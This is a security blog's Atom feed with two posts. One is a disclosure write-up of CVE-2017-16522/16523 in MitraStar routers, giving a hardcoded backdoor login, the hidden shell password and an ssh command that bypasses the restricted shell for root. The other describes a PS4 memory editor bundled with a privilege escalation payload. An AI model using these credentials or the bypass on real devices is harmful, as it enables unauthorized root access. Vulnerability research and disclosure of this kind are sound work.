<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-19T14:58:46+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">j0lama</title><subtitle>Computer engineering and hacking stuff</subtitle><entry><title type="html">MitraStar routers Remote Privilege Escalation</title><link href="http://localhost:4000/router-attack/" rel="alternate" type="text/html" title="MitraStar routers Remote Privilege Escalation" /><published>2017-10-23T00:00:00+02:00</published><updated>2017-10-23T00:00:00+02:00</updated><id>http://localhost:4000/router-attack</id><content type="html" xml:base="http://localhost:4000/router-attack/">&lt;p&gt;In this post I will describe how I discovered the vulnerabilities &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-16522&quot;&gt;CVE-2017-16522&lt;/a&gt; and &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-16523&quot;&gt;CVE-2017-16523&lt;/a&gt;. These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with with version up to november 2017.&lt;/p&gt;

&lt;p&gt;The devices where the research has been made are the MitraStar DSL-100HN-T1 (“&lt;em&gt;the old&lt;/em&gt;”) and the MitraStar GPT-2541GNAC (HGU) (“&lt;em&gt;the new&lt;/em&gt;”).&lt;/p&gt;

&lt;p&gt;&lt;em&gt;The old&lt;/em&gt; with a firmware version ES_113WJY0b16:&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
      &lt;img src=&quot;/images/router-attack/old.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;&lt;em&gt;The new&lt;/em&gt; with a firmware version 1.00(VNJ0)b1:&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
      &lt;img src=&quot;/images/router-attack/new.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;These two vulnerabilities can be considered as only one that elevate privileges remotely on the router avoiding the preseted shell.&lt;/p&gt;

&lt;h4 id=&quot;getting-access-to-the-router&quot;&gt;Getting access to the router&lt;/h4&gt;

&lt;p&gt;THe first thing that I did was a port scanning with the tool &lt;em&gt;nmap&lt;/em&gt; in the old:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &amp;lt;router_ip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;With the the following result:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    filtered telnet
53/tcp    open     domain
80/tcp    open     http
443/tcp   open     https
8080/tcp  open     http-proxy
49152/tcp open     unknown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This router has &lt;em&gt;ssh&lt;/em&gt; running on the port 22 and with some google searches I found that the default user is &lt;em&gt;admin&lt;/em&gt; and the password is under the router.
I also discovered months later with reverse engineering that in some routers exist a user call &lt;em&gt;zyad1234&lt;/em&gt; with password &lt;em&gt;zyad1234&lt;/em&gt; (Vulnerability CVE-2017-16523).&lt;/p&gt;

&lt;p&gt;In my case, with the &lt;em&gt;admin&lt;/em&gt; user I could get access to the router.&lt;/p&gt;

&lt;p&gt;When yoy log in to the router throungh &lt;em&gt;ssh&lt;/em&gt; the router provides you a limitate shell with some commands that allow you to modify some parameters such as the DHCP, lan parameters, and install updates and configurations. All this functions can be executed through the router’s configuration website at 192.168.1.1.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh 1234@192.168.1.3
1234@192.168.1.3&lt;span class=&quot;s1&quot;&gt;'s password: 
 &amp;gt;ls
Can'&lt;/span&gt;t find &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Type &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;?
Valid commands are:
?               &lt;span class=&quot;nb&quot;&gt;exit            &lt;/span&gt;save            sys             restoredefault
wan             lan             igmp            wlan            nat
routing         
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;sys
Missing subcommand. Valid subcommands are:
process         userPasswd      passwd          telnetd         state
swversion       swupdate        updatecfg       backupcfg       dumpcfg
sysdiagd        firewall        upnp            reboot          exitOnIdle
ppp             
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;sys swversion
V1.13&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WJY.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;b15
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;looking-for-some-bugs&quot;&gt;Looking for some bugs&lt;/h4&gt;

&lt;p&gt;The first thing that I tried was to introduce a long string to produce a buffer overflow or some crashes:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Cant find &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]. Type &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the impossibility of find a buffer overflow I introduced accidentally the &lt;em&gt;sh&lt;/em&gt; command:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;sh
Password:Password incorrect &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This output means that there is a &lt;em&gt;sh&lt;/em&gt; command that requires a password and it should give you access to a more privilege shell but the password is unknown.&lt;/p&gt;

&lt;h4 id=&quot;using-other-versions&quot;&gt;Using other versions&lt;/h4&gt;

&lt;p&gt;Afer days without any result I decided to use the other router (&lt;em&gt;the new&lt;/em&gt;). This router has a differente software version with the same pseudo-shell but with more commands such as &lt;em&gt;cat&lt;/em&gt; (used to check if a specific file exists) or the &lt;em&gt;ps&lt;/em&gt; command:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
1234:Mt3cwxDUQQ7AY:0:0:Administrator:/:/bin/sh
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ps
  PID USER       VSZ STAT COMMAND
    1 1234      1700 S    init
    2 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kthreadd]
    3 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ksoftirqd/0]
    5 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/u:0]
    6 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;migration/0]
    7 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;migration/1]
    9 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ksoftirqd/1]
   11 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;khelper]
   54 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sync_supers]
   56 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bdi-default]
   58 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kblockd]
   75 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;skbFreeTask]
   92 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kswapd0]
   93 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fsnotify_mark]
   94 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;crypto]
  151 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock0]
  156 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock1]
  161 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock2]
  166 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock3]
  171 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock4]
  176 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock5]
  181 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock6]
  186 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock7]
  191 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mtdblock8]
  202 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;linkwatch]
  212 1234         0 SW&amp;lt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;deferwq]
  219 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jffs2_gcd_mtd2]
  220 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jffs2_gcd_mtd6]
  221 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jffs2_gcd_mtd7]
  222 1234         0 SWN  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jffs2_gcd_mtd8]
  229 1234      2532 S &amp;lt;  /bin/mm.exe
  233 1234      2532 S    /bin/mm.exe
  234 1234      2532 S    /bin/mm.exe
  235 1234      2532 S    /bin/mm.exe
  236 1234      2532 S    /bin/mm.exe
  237 1234      8596 S &amp;lt;  /bin/icf.exe
  256 1234         0 DW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Pon]
  262 1234      8596 S &amp;lt;  /bin/icf.exe
  263 1234      8596 S &amp;lt;  /bin/icf.exe
  275 1234      1692 D    &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /dev/rgs_logger
  449 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bcmFlwStatsTask]
  496 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bcmsw_rx]
  515 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bcmsw]
  525 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wfd]
  529 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wl0-kthrd]
  623 1234      6248 S    /bin/smd
  626 1234      6884 S    ssk
  641 1234      1444 S    dnsproxy
  644 1234      1420 S    sntp &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; hora.ngn.rima-tde.net &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; CET-1CEST,M3.5.0/2:
  669 1234      2048 S    dhcpd
  818 1234      3768 S    rastatus6
 1283 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/u:2]
 1320 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1495 1234      6776 S    mcpd
 1496 1234      8760 S    omcid &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 0 start
 1625 1234      9576 S    omcipmd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1626 1234       928 S    cpuload
 1627 1234      7896 S    wlmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1628 1234      8128 S    voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1629 1234      6644 S    rmt_qcsmngr_watchDog &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1634 1234      6600 S    /bin/sskwatchdog
 1643 1234      7896 S    wlmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1644 1234      7896 S    wlmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1668 1234      8128 S    voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1669 1234      8128 S    voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1697 1234      1700 S    -/bin/sh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; consoled
 1699 1234      9036 S    consoled
 1706 1234      1404 S    /bin/wlevt
 1709 1234      2532 S &amp;lt;  /bin/mm.exe
 1710 1234      2532 S &amp;lt;  /bin/mm.exe
 1711 1234      2532 S &amp;lt;  /bin/mm.exe
 1712 1234      2532 S &amp;lt;  /bin/mm.exe
 1713 1234      2532 S &amp;lt;  /bin/mm.exe
 1714 1234      2532 S &amp;lt;  /bin/mm.exe
 1715 1234      2532 S &amp;lt;  /bin/mm.exe
 1718 1234      2532 S &amp;lt;  /bin/mm.exe
 1719 1234      2532 S &amp;lt;  /bin/mm.exe
 1720 1234      2532 S    /bin/mm.exe
 1721 1234      8128 S &amp;lt;  voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1722 1234      8128 S &amp;lt;  voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1723 1234      8128 S    voiceApp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 1845 1234      1628 S    /bin/lld2d br0
 1850 1234      1552 S    /bin/eapd
 1853 1234      1920 S    /bin/nas
 1863 1234      1652 S    /bin/acsd
 1865 1234      2972 S    /bin/wps_monitor
 1936 1234      1020 S    radvd &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; /var/radvd.conf
 2101 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 2102 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 2103 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 2104 1234      9144 S    rmt_qcsmngr &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 7349 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:0]
 7638 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:2]
 8290 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;flush-mtd-unmap]
 8565 1234      9300 S    sshd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 8578 1234      9308 S    sshd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
 8847 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:0]
 8956 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:1]
 9455 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:2]
 9944 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:1]
10047 1234      1696 S    sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; ps
10048 1234      1700 R    ps
25183 1234         0 SW   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/1:3]
30628 1234      1696 S    sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /bin/sh
30629 1234      1696 S    /bin/sh
30892 1234      9256 R    ./sshd
32030 1234      1696 S    sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /bin32031 1234      1696 S    /bin32079 1234      9256 R    ./sshd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After explore some commands I found the &lt;em&gt;deviceinfo&lt;/em&gt; command that offers the following possibilities:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; deviceinfo
Usage: deviceinfo show serialnumber
   deviceinfo show ploampw
   deviceinfo &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;serialnumber &amp;lt;value&amp;gt;
   deviceinfo &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;ploampw &amp;lt;value&amp;gt;
   deviceinfo show datetime
   deviceinfo show cpuload
   deviceinfo show meminfo
   deviceinfo show file &amp;lt;path&amp;gt;
   deviceinfo show interface
   deviceinfo &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The command &lt;em&gt;deviceinfo show file /&lt;/em&gt; works as the &lt;em&gt;ls&lt;/em&gt; command and allows us to list all the files and directories that are in /:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; deviceinfo show file /
app          debug        linuxrc      sbin         usrcfg
bin          dev          mnt          sys          var
cfg_upgrade  etc          opt          tmp          vmlinux.lz
data         lib          proc         usr          webs
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I was generating the file system tree and looking for some files with information about the &lt;em&gt;sh&lt;/em&gt; command password but I didn’t find anything.&lt;/p&gt;

&lt;h4 id=&quot;the-vulnerability&quot;&gt;The vulnerability&lt;/h4&gt;
&lt;p&gt;The next day I came back to &lt;em&gt;the old&lt;/em&gt; to try new things but surprisingly I decided to try something unusual. Instead of connect with the router with the command *ssh admin@&lt;router_ip&gt;*, I decided to add the path to the *sh* binary (/bin/sh) as second parameter because by default *ssh* execute the command passed as argument.&lt;/router_ip&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh 1234@192.168.1.2 &amp;lt;comand&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output was the following:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh 1234@192.168.1.3 /bin/sh
1234@192.168.1.3&lt;span class=&quot;s1&quot;&gt;'s password: 

					

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This looked like there was something wrong and I was waiting for connection but I tried to introduce the &lt;em&gt;ls&lt;/em&gt; command and surprisingly was executed succesfully!
I had access to an privilege shell with a complete root access to the system.&lt;/p&gt;

&lt;h4 id=&quot;some-reverse-engineering&quot;&gt;Some reverse engineering&lt;/h4&gt;

&lt;p&gt;I found that the default shell for ssh was a binary call cmdsh in the /bin/ folder.&lt;/p&gt;

&lt;p&gt;I was still needing the &lt;em&gt;sh&lt;/em&gt; command password so I decided to bring the binary to my laptop an execute IDA Pro.
The binary was compiled for MIPS architecture and I only needed to find where the string “Password incorrect!” is used to see a condition before, that compare a string with the string “c93vu02jp4z04”, the &lt;em&gt;sh&lt;/em&gt; password.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
      &lt;img src=&quot;/images/router-attack/ida.png&quot; /&gt;
&lt;/p&gt;

&lt;h4 id=&quot;conclutions&quot;&gt;Conclutions&lt;/h4&gt;

&lt;p&gt;I hope you had enjoy reading as much I do writing this post and over all learning something new.
If you want more post like this one make it me know thorugh Twitter or buying me a &lt;a href=&quot;https://ko-fi.com/jolama&quot;&gt;Ko-Fi&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">In this post I will describe how I discovered the vulnerabilities CVE-2017-16522 and CVE-2017-16523. These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with with version up to november 2017.</summary></entry><entry><title type="html">PS4ME (PS4 Memory Editor)</title><link href="http://localhost:4000/ps4me/" rel="alternate" type="text/html" title="PS4ME (PS4 Memory Editor)" /><published>2017-03-25T00:00:00+01:00</published><updated>2017-03-25T00:00:00+01:00</updated><id>http://localhost:4000/ps4me</id><content type="html" xml:base="http://localhost:4000/ps4me/">&lt;p&gt;As I said on my &lt;a href=&quot;/ps4-rte/&quot;&gt;last post&lt;/a&gt;, my main objective is to develop a software similar to PS3TMAPI/PS3CCAPI but for PS4.&lt;/p&gt;

&lt;p&gt;PS4ME.dll is a shared Windows library with all the required functions to connect with a 1.76 PS4 and read/write any process memory.&lt;/p&gt;

&lt;p&gt;Nowadays PS4ME has the following functions:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Connect to a PS4 with the specified IP:
    &lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Disconnect:
    &lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Listed the running processes:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;string[] getProcesses()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Attach to a process:
    &lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AttachProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProcessName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Dump process meory:
    &lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dumpMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Write memory:
    &lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;writeMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Read memory:
    &lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A payload with the privilege escalation dissabling ASLR is included in the download. Its recommended to execute PS4ME before start any game to enable all functions correctly.&lt;/p&gt;

&lt;h2 id=&quot;ps4metool&quot;&gt;PS4METool&lt;/h2&gt;
&lt;p&gt;I have developed as an example of use this tool using PS4ME.dll.&lt;/p&gt;

&lt;p&gt;It’s a simple GUI for interact with the PS4 using a HEX editor to read and modify values. Also it has support to get the running processes and to show the game memory in real time.&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/ps4me/tool.png&quot; /&gt;
&lt;/p&gt;

